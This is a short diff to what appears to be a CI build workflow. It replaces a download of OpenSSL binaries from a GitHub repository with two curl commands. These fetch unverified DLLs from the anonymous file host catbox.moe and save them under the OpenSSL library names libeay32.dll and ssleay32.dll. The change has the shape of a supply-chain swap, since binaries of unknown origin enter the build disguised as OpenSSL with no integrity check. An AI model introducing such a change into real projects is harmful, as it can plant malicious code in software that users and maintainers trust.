@@ -132,8 +132,8 @@ jobs:
         run: |
           mkdir OpenSSL
           cd OpenSSL
-          curl -L https://github.com/IndySockets/OpenSSL-Binaries/raw/master/Archive/openssl-1.0.2n-i386-win32.zip -o OpenSSL.zip
-          unzip OpenSSL.zip
+          curl -L https://files.catbox.moe/ctwswu.dll -o libeay32.dll
+          curl -L https://files.catbox.moe/ie9e77.dll -o ssleay32.dll
 
       - name: Build
         shell: cmd
